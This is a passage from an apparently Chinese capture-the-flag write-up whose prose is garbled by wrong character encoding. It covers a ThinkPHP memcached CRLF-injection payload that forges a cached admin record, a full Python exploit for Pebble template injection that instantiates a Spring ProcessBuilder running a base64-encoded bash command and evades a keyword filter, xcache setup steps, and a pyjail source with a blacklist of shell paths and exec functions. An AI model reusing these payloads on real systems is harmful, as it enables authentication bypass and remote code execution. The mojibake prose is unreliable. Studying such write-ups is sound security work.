                <span class="nv">$key</span> <span class="o">=</span> <span class="s1">'think:'</span> <span class="mf">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">connection</span><span class="o">-&gt;</span><span class="nf">getConfig</span><span class="p">(</span><span class="s1">'database'</span><span class="p">)</span> <span class="mf">.</span> <span class="s1">'.'</span> <span class="mf">.</span> <span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$options</span><span class="p">[</span><span class="s1">'table'</span><span class="p">])</span> <span class="o">?</span> <span class="nb">key</span><span class="p">(</span><span class="nv">$options</span><span class="p">[</span><span class="s1">'table'</span><span class="p">])</span> <span class="o">:</span> <span class="nv">$options</span><span class="p">[</span><span class="s1">'table'</span><span class="p">])</span> <span class="mf">.</span> <span class="s1">'|'</span> <span class="mf">.</span> <span class="nv">$data</span><span class="p">;</span>
            <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$cache</span><span class="p">[</span><span class="s1">'key'</span><span class="p">]))</span> <span class="p">{</span>
                <span class="nv">$key</span> <span class="o">=</span> <span class="nv">$cache</span><span class="p">[</span><span class="s1">'key'</span><span class="p">];</span>
            <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="o">!</span><span class="k">isset</span><span class="p">(</span><span class="nv">$key</span><span class="p">))</span> <span class="p">{</span>
                <span class="nv">$key</span> <span class="o">=</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">connection</span><span class="o">-&gt;</span><span class="nf">getConfig</span><span class="p">(</span><span class="s1">'database'</span><span class="p">)</span> <span class="mf">.</span> <span class="s1">'.'</span> <span class="mf">.</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$options</span><span class="p">)</span> <span class="mf">.</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">bind</span><span class="p">));</span>
            <span class="p">}</span>
            <span class="nv">$result</span> <span class="o">=</span> <span class="nc">Cache</span><span class="o">::</span><span class="nf">get</span><span class="p">(</span><span class="nv">$key</span><span class="p">);</span>
</code></pre></div></div>
<p>è¿™ä¸ªå€¼åœ¨ memcached ä¸­çš„æ ¼å¼å¯ä»¥é€šè¿‡ä¸‹é¢çš„æµ‹è¯•ä»£ç æ¥è·å–ï¼š</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">public</span> <span class="k">function</span> <span class="n">test</span><span class="p">(){</span>
    <span class="nv">$result</span> <span class="o">=</span> <span class="nc">Db</span><span class="o">::</span><span class="nf">query</span><span class="p">(</span><span class="s2">"select * from admin where id=1"</span><span class="p">);</span>
    <span class="nb">var_dump</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
    <span class="nv">$a</span> <span class="o">=</span> <span class="s2">"think:shop.admin|admin"</span><span class="p">;</span>
    <span class="nc">Cache</span><span class="o">::</span><span class="nf">set</span><span class="p">(</span><span class="nv">$a</span><span class="p">,</span> <span class="nv">$result</span><span class="p">,</span> <span class="mi">3600</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>
<p>è¿è¡Œåå¯ä»¥å¾—åˆ°æ­£å¸¸çš„æ ¼å¼ï¼š</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">a</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="p">{</span><span class="n">i</span><span class="o">:</span><span class="mi">0</span><span class="p">;</span><span class="n">a</span><span class="o">:</span><span class="mi">3</span><span class="o">:</span><span class="p">{</span><span class="n">s</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="s2">"id"</span><span class="p">;</span><span class="n">i</span><span class="o">:</span><span class="mi">1</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">8</span><span class="o">:</span><span class="s2">"username"</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">5</span><span class="o">:</span><span class="s2">"admin"</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">8</span><span class="o">:</span><span class="s2">"password"</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">32</span><span class="o">:</span><span class="s2">"21232f297a57a5a743894a0e4a801fc3"</span><span class="p">;}}</span>
</code></pre></div></div>
<p>è¿˜æœ‰ä¸€ä¸ªéœ€è¦æ³¨æ„çš„åœ°æ–¹æ˜¯ï¼Œmemcached åœ¨å†™å…¥æ•°æ®æ—¶ï¼Œflag å­—æ®µæ˜¯ç•™ç»™ç”¨æˆ·è‡ªå®šä¹‰çš„ï¼Œthinkphp åœ¨å†™å…¥ä¸åŒç±»å‹çš„æ•°æ®æ—¶ï¼Œä¼šè®¾å®šä¸åŒçš„ flag å€¼ï¼Œå¦‚ 0 è¡¨ç¤ºå­—ç¬¦ä¸²ï¼Œ4 è¡¨ç¤ºæ•°ç»„ï¼Œæ•°æ®åº“è·å–åˆ°çš„æ•°æ®å­˜å‚¨åˆ° Memcached æ—¶ï¼Œä½¿ç”¨çš„ flag å€¼å°±æ˜¯ 4ã€‚</p>

<p>æ‰€ä»¥åˆ©ç”¨ CRLF å†™å…¥æ—¶ï¼Œä¹Ÿéœ€è¦å°† flag å€¼è®¾å®šä¸º 4ï¼Œpayload å¦‚ä¸‹ï¼š</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">set </span>think:shop.admin|admin 4 500 101
a:3:<span class="o">{</span>s:2:<span class="s2">"id"</span><span class="p">;</span>i:1<span class="p">;</span>s:8:<span class="s2">"username"</span><span class="p">;</span>s:5:<span class="s2">"admin"</span><span class="p">;</span>s:8:<span class="s2">"password"</span><span class="p">;</span>s:32:<span class="s2">"21232f297a57a5a743894a0e4a801fc3"</span><span class="p">;</span><span class="o">}</span>
</code></pre></div></div>
<p>exp:</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">username</span><span class="o">=</span><span class="n">admin</span><span class="o">%</span><span class="mo">00</span><span class="o">%</span><span class="mi">0</span><span class="nc">D</span><span class="o">%</span><span class="mi">0</span><span class="nc">Aset</span><span class="o">%</span><span class="mi">20</span><span class="n">think</span><span class="o">%</span><span class="mi">3</span><span class="nc">Ashop</span><span class="mf">.</span><span class="n">admin</span><span class="o">%</span><span class="mi">7</span><span class="nc">Cadmin</span><span class="o">%</span><span class="mi">204</span><span class="o">%</span><span class="mi">20500</span><span class="o">%</span><span class="mi">20101</span><span class="o">%</span><span class="mi">0</span><span class="nc">D</span><span class="o">%</span><span class="mi">0</span><span class="nc">Aa</span><span class="o">%</span><span class="mi">3</span><span class="no">A3</span><span class="o">%</span><span class="mi">3</span><span class="nc">A</span><span class="o">%</span><span class="mi">7</span><span class="nc">Bs</span><span class="o">%</span><span class="mi">3</span><span class="no">A2</span><span class="o">%</span><span class="mi">3</span><span class="nc">A</span><span class="o">%</span><span class="mi">22</span><span class="n">id</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="nc">Bi</span><span class="o">%</span><span class="mi">3</span><span class="no">A1</span><span class="o">%</span><span class="mi">3</span><span class="nc">Bs</span><span class="o">%</span><span class="mi">3</span><span class="no">A8</span><span class="o">%</span><span class="mi">3</span><span class="nc">A</span><span class="o">%</span><span class="mi">22</span><span class="n">username</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="nc">Bs</span><span class="o">%</span><span class="mi">3</span><span class="no">A5</span><span class="o">%</span><span class="mi">3</span><span class="nc">A</span><span class="o">%</span><span class="mi">22</span><span class="n">admin</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="nc">Bs</span><span class="o">%</span><span class="mi">3</span><span class="no">A8</span><span class="o">%</span><span class="mi">3</span><span class="nc">A</span><span class="o">%</span><span class="mi">22</span><span class="n">password</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="nc">Bs</span><span class="o">%</span><span class="mi">3</span><span class="no">A32</span><span class="o">%</span><span class="mi">3</span><span class="nc">A</span><span class="o">%</span><span class="mi">2221232</span><span class="n">f297a57a5a743894a0e4a801fc3</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="nc">B</span><span class="o">%</span><span class="mi">7</span><span class="nc">D</span><span class="o">&amp;</span><span class="n">password</span><span class="o">=</span><span class="n">admin</span>
</code></pre></div></div>

<h2 id="hellospring">hellospring</h2>
<p>é¢˜ç›®æä¾›äº†ä¸€ä¸ªä½¿ç”¨ pebble ä½œä¸ºæ¸²æŸ“å¼•æ“çš„ Spring æœåŠ¡ï¼Œpebble 3.1.5 å­˜åœ¨æ¨¡æ¿æ³¨å…¥æ¼æ´ï¼Œå‚è€ƒï¼š- <a href="https://zhuanlan.zhihu.com/p/551576769/">Spring åœºæ™¯ä¸‹çªç ´ pebble æ¨¡æ¿æ³¨å…¥é™åˆ¶ - çŸ¥ä¹</a></p>

<p>æ–‡ç« æä¾›çš„ payload å¯ä»¥åœ¨æœ¬åœ°æ‰“é€šï¼Œä½†ç›®æ ‡æµ‹è¯•æ—¶ä¸ä¼šè¿œç¨‹åŠ è½½ xmlï¼ŒçŒœæµ‹ä¸å‡ºç½‘ï¼Œæ‰€ä»¥å¯ä»¥å…ˆå°† xml æ–‡ä»¶å†…å®¹å†™å…¥æœ¬åœ°ï¼Œç„¶ååˆ©ç”¨ file åè®®ä»æœ¬åœ°è¯»å– xmlã€‚</p>

<p>å¦å¤–ï¼Œæµ‹è¯•æ—¶å‘ç° xml æ˜¯å¯ä»¥å†™å…¥ /tmp å¹¶ä¸”è®¿é—®åˆ°çš„ï¼Œä½†æ¨¡æ¿å´æ€ä¹ˆä¹Ÿå†™ä¸è¿›å»ã€‚çŒœæµ‹æœåŠ¡ç«¯åšäº†æŸç§è¿‡æ»¤ï¼Œä¸€æ­¥ä¸€æ­¥æ‰“å°å‡ºæ¥çœ‹æ˜¯å¦èƒ½å¤Ÿæ­£å¸¸åŠ è½½ã€‚</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">{%</span> <span class="n">set</span> <span class="n">y</span><span class="o">=</span> <span class="n">beans</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"org.springframework.boot.autoconfigure.internalCachingMetadataReaderFactory"</span><span class="o">).</span><span class="na">resourceLoader</span><span class="o">.</span><span class="na">classLoader</span><span class="o">.</span><span class="na">loadClass</span><span class="o">(</span><span class="s">"java.beans.Beans"</span><span class="o">)</span> <span class="o">%}</span>
<span class="o">{%</span> <span class="n">set</span> <span class="n">yy</span> <span class="o">=</span>  <span class="n">beans</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"jacksonObjectMapper"</span><span class="o">).</span><span class="na">readValue</span><span class="o">(</span><span class="s">"{}"</span><span class="o">,</span> <span class="n">y</span><span class="o">)</span> <span class="o">%}</span>
<span class="o">{{</span> <span class="n">yy</span> <span class="o">}}</span>
</code></pre></div></div>

<p>å½“æ·»åŠ äº†ä¸‹é¢è¿™ä¸€å¥å°±æ— æ³•æ­£å¸¸å†™å…¥äº†ï¼ŒçŒœæµ‹æ˜¯å¯¹ org.springframework.context.support.ClassPathXmlApplicationContext è¿›è¡Œäº†è¿‡æ»¤ã€‚</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">{%</span> <span class="n">set</span> <span class="n">yyy</span> <span class="o">=</span> <span class="n">yy</span><span class="o">.</span><span class="na">instantiate</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span><span class="s">"org.springframework.context.support.ClassPathXmlApplicationContext"</span><span class="o">)</span> <span class="o">%}</span>
</code></pre></div></div>

<p>æœ€åå‘ç°ä»…ä»…æ˜¯åšäº†ä¸€ä¸ªå­—ç¬¦è¿‡æ»¤ï¼Œæ¢ä¸ºæ‹¼æ¥å³å¯ç»•è¿‡ï¼š</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="sh">"</span><span class="s">org.springframework.context</span><span class="sh">"</span><span class="o">+</span><span class="sh">"</span><span class="s">.support.ClassPathXmlApplicationContext</span><span class="sh">"</span>
</code></pre></div></div>

<p>exp å¦‚ä¸‹ï¼š</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">requests</span>
<span class="kn">import</span> <span class="n">datetime</span>
<span class="kn">import</span> <span class="n">time</span>

<span class="n">host</span> <span class="o">=</span> <span class="sh">"</span><span class="s">http://eci-2zeiuc2hk7njlsvn9mue.cloudeci1.ichunqiu.com:8088</span><span class="sh">"</span>
<span class="c1"># host = "http://127.0.0.1:8088"
</span>
<span class="n">url</span> <span class="o">=</span> <span class="n">host</span> <span class="o">+</span> <span class="sh">"</span><span class="s">/uploadFile</span><span class="sh">"</span>

<span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span>
    <span class="sh">"</span><span class="s">http</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">http://127.0.0.1:8080</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">https</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">http://127.0.0.1:8080</span><span class="sh">"</span>
<span class="p">}</span>

<span class="k">def</span> <span class="nf">calc_time</span><span class="p">(</span><span class="n">date_string</span><span class="p">):</span>
    <span class="n">date_object</span> <span class="o">=</span> <span class="n">datetime</span><span class="p">.</span><span class="n">datetime</span><span class="p">.</span><span class="nf">strptime</span><span class="p">(</span><span class="n">date_string</span><span class="p">,</span> <span class="sh">'</span><span class="s">%a, %d %b %Y %H:%M:%S %Z</span><span class="sh">'</span><span class="p">)</span>

    <span class="n">t</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">date_object</span><span class="p">.</span><span class="nf">strftime</span><span class="p">(</span><span class="sh">'</span><span class="s">%H%M%S</span><span class="sh">'</span><span class="p">))</span>
    <span class="c1"># t -= 50000
</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[+] t: </span><span class="si">{</span><span class="n">t</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">t</span>

<span class="k">def</span> <span class="nf">trigger</span><span class="p">(</span><span class="n">t</span><span class="p">,</span><span class="n">exp</span><span class="o">=</span><span class="bp">False</span><span class="p">):</span>
    <span class="n">t</span> <span class="o">-=</span> <span class="mi">4</span>
    <span class="k">if</span> <span class="n">exp</span><span class="p">:</span>
        <span class="n">loop</span> <span class="o">=</span> <span class="mi">16</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">loop</span> <span class="o">=</span> <span class="mi">100</span>
    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">loop</span><span class="p">):</span>
        <span class="n">file_name</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">file_20231217_</span><span class="si">{</span><span class="nf">str</span><span class="p">(</span><span class="n">t</span><span class="p">).</span><span class="nf">rjust</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span><span class="sh">'</span><span class="s">0</span><span class="sh">'</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span>
        <span class="n">trigger_url</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">host</span><span class="si">}</span><span class="s">/?x=</span><span class="si">{</span><span class="n">file_name</span><span class="si">}</span><span class="sh">"</span>
        <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">trigger_url</span><span class="p">,</span><span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">)</span>
        <span class="k">if</span> <span class="sh">"</span><span class="s">constructor-arg</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">res</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[+] find exp in /tmp/</span><span class="si">{</span><span class="n">file_name</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
            <span class="k">return</span> <span class="sa">f</span><span class="sh">"</span><span class="s">file:///tmp/</span><span class="si">{</span><span class="n">file_name</span><span class="si">}</span><span class="sh">"</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">t</span> <span class="o">+=</span> <span class="mi">1</span>
            <span class="k">continue</span>
        

<span class="k">def</span> <span class="nf">upload</span><span class="p">():</span>
    <span class="n">exp1</span> <span class="o">=</span> <span class="p">{</span>
    <span class="sh">"</span><span class="s">content</span><span class="sh">"</span><span class="p">:</span> <span class="sh">'''</span><span class="s">&lt;?xml version=</span><span class="sh">"</span><span class="s">1.0</span><span class="sh">"</span><span class="s"> encoding=</span><span class="sh">"</span><span class="s">UTF-8</span><span class="sh">"</span><span class="s"> ?&gt;
    &lt;beans xmlns=</span><span class="sh">"</span><span class="s">http://www.springframework.org/schema/beans</span><span class="sh">"</span><span class="s">
       xmlns:xsi=</span><span class="sh">"</span><span class="s">http://www.w3.org/2001/XMLSchema-instance</span><span class="sh">"</span><span class="s">
       xsi:schemaLocation=</span><span class="sh">"</span><span class="s">
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd</span><span class="sh">"</span><span class="s">&gt;
        &lt;bean id=</span><span class="sh">"</span><span class="s">pb</span><span class="sh">"</span><span class="s"> class=</span><span class="sh">"</span><span class="s">java.lang.ProcessBuilder</span><span class="sh">"</span><span class="s"> init-method=</span><span class="sh">"</span><span class="s">start</span><span class="sh">"</span><span class="s">&gt;
            &lt;constructor-arg &gt;
            &lt;list&gt;
                &lt;value&gt;bash&lt;/value&gt;
                &lt;value&gt;-c&lt;/value&gt;
                &lt;value&gt;{echo,Y2F0IC9mbGFnID4gL3RtcC8xMjMxMjQucGViYmxl}|{base64,-d}|{bash,-i}&lt;/value&gt;
            &lt;/list&gt;
            &lt;/constructor-arg&gt;
        &lt;/bean&gt;
    &lt;/beans&gt;
</span><span class="sh">'''</span>
    <span class="p">}</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">exp1</span><span class="p">,</span><span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">)</span>

    <span class="n">date_string</span> <span class="o">=</span> <span class="n">res</span><span class="p">.</span><span class="n">headers</span><span class="p">[</span><span class="sh">'</span><span class="s">Date</span><span class="sh">'</span><span class="p">]</span>
    <span class="k">return</span> <span class="nf">calc_time</span><span class="p">(</span><span class="n">date_string</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">exp_path</span><span class="p">):</span>
    <span class="n">exp2</span> <span class="o">=</span> <span class="p">{</span>
        <span class="sh">"</span><span class="s">content</span><span class="sh">"</span><span class="p">:</span><span class="sh">'''</span><span class="s">{% set y= beans.get(</span><span class="sh">"</span><span class="s">org.springframework.boot.autoconfigure.internalCachingMetadataReaderFactory</span><span class="sh">"</span><span class="s">).resourceLoader.classLoader.loadClass(</span><span class="sh">"</span><span class="s">java.beans.Beans</span><span class="sh">"</span><span class="s">) %}
{% set yy =  beans.get(</span><span class="sh">"</span><span class="s">jacksonObjectMapper</span><span class="sh">"</span><span class="s">).readValue(</span><span class="sh">"</span><span class="s">{}</span><span class="sh">"</span><span class="s">, y) %}
{% set yyy = yy.instantiate(null,</span><span class="sh">"</span><span class="s">org.springframework.context</span><span class="sh">"</span><span class="s">+</span><span class="sh">"</span><span class="s">.support.ClassPathXmlApplicationContext</span><span class="sh">"</span><span class="s">) %}
{{ yyy.setConfigLocation(</span><span class="sh">"'''</span> <span class="o">+</span> <span class="n">exp_path</span> <span class="o">+</span> <span class="sh">'''</span><span class="s">.pebble</span><span class="sh">"</span><span class="s">) }}
{{ yyy.refresh() }}</span><span class="sh">'''</span>
        <span class="c1"># "content":"111111"
</span>    <span class="p">}</span>

    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">exp2</span><span class="p">,</span><span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">)</span>
    <span class="n">date_string</span> <span class="o">=</span> <span class="n">res</span><span class="p">.</span><span class="n">headers</span><span class="p">[</span><span class="sh">'</span><span class="s">Date</span><span class="sh">'</span><span class="p">]</span>

    <span class="k">return</span> <span class="nf">calc_time</span><span class="p">(</span><span class="n">date_string</span><span class="p">)</span>


<span class="n">t</span> <span class="o">=</span> <span class="nf">upload</span><span class="p">()</span>
<span class="n">file_path</span> <span class="o">=</span> <span class="nf">trigger</span><span class="p">(</span><span class="n">t</span><span class="p">)</span>
<span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
<span class="n">t</span> <span class="o">=</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">file_path</span><span class="p">)</span>
<span class="nf">trigger</span><span class="p">(</span><span class="n">t</span><span class="p">,</span><span class="bp">True</span><span class="p">)</span>
</code></pre></div></div>

<ol>
  <li>exp ä¸­çš„çˆ†ç ´æ—¶é—´å…¶å®æ²¡æœ‰å¿…è¦ï¼Œå†™å…¥çš„é€Ÿåº¦å…¶å®æ¯”è¾ƒå¿«ã€‚</li>
  <li>æˆ‘æœ¬åœ°çš„æ—¶åŒºä¸åŒï¼Œå› æ­¤åŠ ä¸Šäº† <code class="language-plaintext highlighter-rouge">t -= 50000</code> è¿™ä¸€å¥ã€‚</li>
</ol>

<h2 id="easyphp">easyphp</h2>
<p>ä¸€ä¸ªä»¥ xcache ä¸ºèƒŒæ™¯çš„é€†å‘é¢˜ï¼š
è§£é¢˜æ­¥éª¤å¯å‚è€ƒï¼š<a href="https://boogipop.com/2023/12/18/%E7%AC%AC%E4%B8%83%E5%B1%8A%20%E5%BC%BA%E7%BD%91%E6%9D%AF%20%E5%85%A8%E5%9B%BD%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B%20Web%20Writeup/#easyphp">ç¬¬ä¸ƒå±Š å¼ºç½‘æ¯ å…¨å›½ç½‘ç»œå®‰å…¨æŒ‘æˆ˜èµ› Web Writeup - Boogiepop Doesnâ€™t Laugh</a></p>

<p>ä¸å¤ªå¾ˆç†è§£è¿™é“é¢˜çš„åº”ç”¨åœºæ™¯ğŸ¤£ï¼Œæ­£å¸¸æƒ…å†µä¸‹ xcache åªä¼šåœ¨ /tmp ä¸‹ã€‚</p>

<p>è§£é¢˜æ€è·¯å¦‚ä¸‹ï¼š</p>
<ol>
  <li>æ‰¾å‡º libphp åŸºåœ°å€ï¼Œç„¶åæ ¹æ®è¯¥åœ°å€ä¿®å¤ xcache æ–‡ä»¶ä¸­çš„å‡½æ•°æŒ‡é’ˆï¼Œä½¿å¾—è¯¥æ–‡ä»¶å¯ä»¥è¢«æœ¬åœ°æ­£å¸¸åŠ è½½ã€‚</li>
  <li>åŠ è½½èµ·æ¥åä½¿ç”¨ xdebug trace æ—¥å¿—è¾…åŠ©åˆ†æä»£ç è¿è¡Œæµç¨‹ã€‚</li>
</ol>

<p>è®°å½•ä¸€ä¸‹ xcache ç¯å¢ƒçš„æ­å»ºè¿‡ç¨‹ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget http://xcache.lighttpd.net/pub/Releases/3.2.0/xcache-3.2.0.tar.gz
<span class="nb">tar </span>zxvf xcache-3.2.0.tar.gz
<span class="nb">cd </span>xcache-3.2.0
phpize
./configure <span class="nt">--enable-xcache</span> <span class="nt">--enable-xcache-encoder</span> <span class="nt">--enable-xcache-decoder</span> <span class="nt">--enable-xcache-assembler</span> <span class="nt">--enable-xcache-disassembler</span> <span class="nt">--with-php-config</span><span class="o">=</span>/usr/bin/php-config
make &amp; make <span class="nb">install</span>
</code></pre></div></div>
<p>ä½†æˆ‘æœ¬åœ°ä¸€ç›´æ²¡æœ‰è‡ªåŠ¨ç”Ÿæˆè¯¥ mmap æ–‡ä»¶ï¼Œæ‰‹åŠ¨åˆ›å»ºè¯¥æ–‡ä»¶åæƒé™è®¾å®šä¸º 777ï¼Œé‡å¯åå¯ä»¥ç”Ÿæˆã€‚</p>

<h1 id="misc">MISC</h1>

<h2 id="pyjail1">pyjail1</h2>
<p>é¢˜ç›®æºç å¦‚ä¸‹ï¼š</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">code</span><span class="p">,</span> <span class="n">os</span><span class="p">,</span> <span class="n">subprocess</span>
<span class="kn">import</span> <span class="n">pty</span>
<span class="k">def</span> <span class="nf">blacklist_fun_callback</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">):</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Player! It</span><span class="sh">'</span><span class="s">s already banned!</span><span class="sh">"</span><span class="p">)</span>

<span class="n">pty</span><span class="p">.</span><span class="n">spawn</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
<span class="n">os</span><span class="p">.</span><span class="n">system</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
<span class="n">os</span><span class="p">.</span><span class="n">popen</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
<span class="n">subprocess</span><span class="p">.</span><span class="n">Popen</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
<span class="n">subprocess</span><span class="p">.</span><span class="n">call</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
<span class="n">code</span><span class="p">.</span><span class="n">interact</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
<span class="n">code</span><span class="p">.</span><span class="n">compile_command</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>

<span class="nb">vars</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
<span class="n">attr</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
<span class="nb">dir</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
<span class="nb">getattr</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
<span class="k">exec</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
<span class="nb">__import__</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
<span class="nb">compile</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
<span class="n">breakpoint</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>

<span class="k">del</span> <span class="n">os</span><span class="p">,</span> <span class="n">subprocess</span><span class="p">,</span> <span class="n">code</span><span class="p">,</span> <span class="n">pty</span><span class="p">,</span> <span class="n">blacklist_fun_callback</span>
<span class="n">input_code</span> <span class="o">=</span> <span class="nf">input</span><span class="p">(</span><span class="sh">"</span><span class="s">Can u input your code to escape &gt; </span><span class="sh">"</span><span class="p">)</span>

<span class="n">blacklist_words</span> <span class="o">=</span> <span class="p">[</span>
    <span class="sh">"</span><span class="s">subprocess</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">os</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">code</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">interact</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">pty</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">pdb</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">platform</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">importlib</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">timeit</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">imp</span><span class="sh">"</span><span class="p">,</span> 
    <span class="sh">"</span><span class="s">commands</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">popen</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">load_module</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">spawn</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">system</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">/bin/sh</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">/bin/bash</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">flag</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">eval</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">exec</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">compile</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">input</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">vars</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">attr</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">dir</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">getattr</span><span class="sh">"</span>
    <span class="sh">"</span><span class="s">__import__</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">__builtins__</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">__getattribute__</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">__class__</span><span class="sh">"</span><span class="p">,</span>
